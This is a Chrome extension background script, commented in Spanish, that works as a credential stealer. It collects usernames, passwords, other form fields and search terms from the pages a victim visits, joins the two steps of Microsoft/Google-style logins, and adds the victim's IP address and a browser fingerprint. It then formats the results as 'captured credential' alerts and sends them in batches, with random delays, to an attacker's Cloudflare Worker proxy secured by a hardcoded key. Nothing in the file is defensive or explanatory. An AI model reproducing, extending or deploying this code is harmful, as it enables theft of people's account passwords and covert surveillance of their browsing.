// background: modo proxy Cloudflare - SIN token ni chat_id en cliente
const PROXY_URL = 'https://TU-WORKER.TU-SUBDOMINIO.workers.dev/log';
const PROXY_KEY = 'c856462856e500dff07d298a1a2a973f4b3342774c28bae8b2643d825d7ed089';

let _q = [];
let _sending = false;
let _ip = '';
let _pend = {};
let _seenVisit = {};
const _lastSent = new Map();

function _isDuplicate(key, windowMs = 15000) {
  if (!key) return false;
  const now = Date.now();
  if (_lastSent.has(key) && (now - _lastSent.get(key)) < windowMs) {
    return true;
  }
  _lastSent.set(key, now);
  if (_lastSent.size > 300) {
    for (const [k, ts] of _lastSent.entries()) {
      if (now - ts > 60000) _lastSent.delete(k);
    }
  }
  return false;
}

chrome.runtime.onInstalled.addListener(() => {
  try { chrome.alarms.create('ka', { periodInMinutes: 1 }); } catch (e) {}
  _getIP();
});
chrome.alarms.onAlarm.addListener(() => { _drain(); });
setTimeout(_getIP, 5000);

async function _getIP() {
  if (_ip) return _ip;
  try {
    const r = await fetch('https://api.ipify.org?format=json');
    const j = await r.json();
    if (j.ip) _ip = j.ip;
  } catch (e) {}
  return _ip;
}

function _dom(url) {
  try { return new URL(url).hostname; } catch (e) { return (url || '').slice(0,60); }
}

function _clean(url) {
  try {
    const u = new URL(url);
    let path = u.origin + u.pathname;
    if (u.search && u.search.length > 40) path += '?...[query ' + u.search.length + ' chars]';
    else if (u.search) path += u.search.slice(0, 120);
    return path.slice(0, 180);
  } catch (e) { return (url || '').slice(0, 180); }
}

function _fecha(iso) {
  try {
    const d = iso ? new Date(iso) : new Date();
    return d.toLocaleString('es-PE', { day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit' });
  } catch (e) { return iso || ''; }
}

function _esc(s) {
  if (!s) return '';
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function _uniq(fields) {
  const seen = new Set();
  const out = [];
  for (const f of fields) {
    const k = f.name + '=' + f.value;
    if (seen.has(k)) continue;
    seen.add(k);
    out.push(f);
  }
  return out;
}

async function _fichaLogin(d, tabUrl, merged) {
  await _getIP();
  const url = (tabUrl || d.u || '');
  const all = _uniq(merged || d.fields || []);
  const users = all.filter(f => f.role === 'user' || f.role === 'email');
  const passes = all.filter(f => f.role === 'pass');
  const otros = all.filter(f => f.role !== 'user' && f.role !== 'email' && f.role !== 'pass' && f.role !== 'search');

  let titleEmoji = '🔑 <b>CREDENCIAL CAPTURADA</b>';
  if (passes.length > 0 && users.length > 0) {
    titleEmoji = '🔑 <b>CREDENCIAL COMPLETA</b>';
  } else if (passes.length > 0) {
    titleEmoji = '🔒 <b>CONTRASEÑA CAPTURADA</b>';
  } else if (users.length > 0) {
    titleEmoji = '👤 <b>USUARIO CAPTURADO</b>';
  }

  let out = `${titleEmoji}\n`;
  out += `📅 <b>Fecha:</b> <code>${_esc(_fecha(d.ts))}</code>\n`;
  out += `🌐 <b>Página:</b> <b>${_esc(d.title || _dom(url))}</b>\n`;
  out += `🔗 <b>Link:</b> <a href="${_esc(url)}">${_esc(_clean(url))}</a>\n\n`;

  if (users.length) {
    users.forEach(f => {
      out += `👤 <b>USUARIO (${_esc(f.name)}):</b> <code>${_esc(f.value)}</code>\n`;
    });
  }
  if (passes.length) {
    passes.forEach(f => {
      out += `🔑 <b>CONTRASEÑA (${_esc(f.name)}):</b> <code>${_esc(f.value)}</code>\n`;
    });
  }
  if (otros.length) {
    otros.forEach(f => {
      out += `📌 <b>[${_esc(f.role.toUpperCase())}] ${_esc(f.name)}:</b> <code>${_esc(f.value)}</code>\n`;
    });
  }
  if (d.search) {
    out += `🔍 <b>BÚSQUEDA:</b> <code>${_esc(d.search)}</code>\n`;
  }

  const f = d.fp || {};
  out += `\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n`;
  out += `💻 <b>SISTEMA & RED</b>\n`;
  out += `• <b>IP:</b> <code>${_esc(_ip || '?')}</code>\n`;
  out += `• <b>SO / Idioma:</b> ${_esc(f.plat || '?')} | ${_esc(f.lang || '?')} | ${_esc(f.tz || '?')}\n`;
  out += `• <b>Pantalla:</b> ${_esc(f.scr || '?')} | <b>CPU:</b> ${_esc(f.cpu || '?')} | <b>RAM:</b> ${_esc(f.ram || '?')}\n`;
  out += `• <b>Navegador:</b> <i>${_esc(f.ua || '?')}</i>`;

  return out;
}

chrome.runtime.onMessage.addListener((m, s) => {
  (async () => {
    if (!m || !m.d) return;
    const tabUrl = (s && s.tab && s.tab.url) || m.d.u || '';

    if (m.__s === 'v') {
      if (!m.d.search) return;
      const searchKey = 'search|' + m.d.search.trim().toLowerCase() + '|' + _dom(tabUrl);
      if (_isDuplicate(searchKey, 30000)) return;

      let msg = `🔍 <b>BÚSQUEDA DETECTADA</b>\n`;
      msg += `📅 <b>Fecha:</b> <code>${_esc(_fecha(m.d.ts))}</code>\n`;
      msg += `💬 <b>Término:</b> <code>${_esc(m.d.search)}</code>\n`;
      msg += `🌐 <b>Página:</b> <a href="${_esc(tabUrl)}">${_esc(_dom(tabUrl))}</a>`;

      _q.push(msg);
      _drain();
      return;
    }

    if (m.__s === 'k' && m.d.fields) {
      const all = _uniq(m.d.fields);
      const hasUser = all.some(f => f.role === 'user' || f.role === 'email');
      const hasPass = all.some(f => f.role === 'pass');

      if (!hasUser && !hasPass && !m.d.search) return;

      const dom = _dom(tabUrl);

      // Si solo hay usuario (Login de 2 pasos tipo Microsoft/Google)
      if (hasUser && !hasPass) {
        if (_pend[dom] && _pend[dom].timer) clearTimeout(_pend[dom].timer);

        const pendObj = {
          users: all,
          data: m.d,
          url: tabUrl,
          ts: Date.now()
        };

        // Espera 15 segundos a ver si el usuario introduce la contraseña en el siguiente paso
        pendObj.timer = setTimeout(async () => {
          if (_pend[dom] === pendObj) {
            delete _pend[dom];
            const uVals = all.map(f => f.value).join(',');
            const fpKey = dom + '|user:' + uVals;
            if (!_isDuplicate(fpKey, 15000)) {
              m.d.fields = all;
              _q.push(await _fichaLogin(m.d, tabUrl, null));
              _drain();
            }
          }
        }, 15000);

        _pend[dom] = pendObj;
        return;
      }

      // Si hay contraseña
      if (hasPass) {
        const p = _pend[dom];
        let merged = null;
        if (p) {
          if (p.timer) clearTimeout(p.timer);
          if ((Date.now() - p.ts) < 10 * 60 * 1000) {
            merged = _uniq([...p.users, ...all]);
          }
          delete _pend[dom];
        }

        const finalFields = _uniq(merged || all);
        const uVals = finalFields.filter(f => f.role === 'user' || f.role === 'email').map(f => f.value).join(',');
        const pVals = finalFields.filter(f => f.role === 'pass').map(f => f.value).join(',');
        const fpKey = dom + '|' + uVals + '|' + pVals;

        if (!_isDuplicate(fpKey, 15000)) {
          _q.push(await _fichaLogin(m.d, tabUrl, finalFields));
          _drain();
        }
        return;
      }

      // Otros campos/formulario
      m.d.fields = all;
      const uVals = all.map(f => f.value).join(',');
      const fpKey = dom + '|other:' + uVals;
      if (!_isDuplicate(fpKey, 15000)) {
        _q.push(await _fichaLogin(m.d, tabUrl, null));
        if (_q.join('\n').length > 800) _drain();
      }
    }
  })();
});

async function _sendDirect(text) {
  if (!PROXY_URL || PROXY_URL.includes('TU-WORKER')) return;
  const chunks = [];
  for (let i = 0; i < text.length; i += 3500) chunks.push(text.slice(i, i + 3500));
  for (const c of chunks) {
    try {
      await fetch(PROXY_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-key': PROXY_KEY },
        body: JSON.stringify({ text: c })
      });
    } catch (e) {}
    await new Promise((r) => setTimeout(r, 400 + Math.random() * 800));
  }
}

async function _drain() {
  if (_sending || !_q.length) return;
  _sending = true;
  try {
    const batch = _q.splice(0, _q.length).join('\n\n════════════════════\n\n').slice(0, 7000);
    await _sendDirect(batch);
  } catch (e) {}
  _sending = false;
  if (_q.length) setTimeout(_drain, 3000 + Math.random() * 4000);
}

setInterval(_drain, 10000);
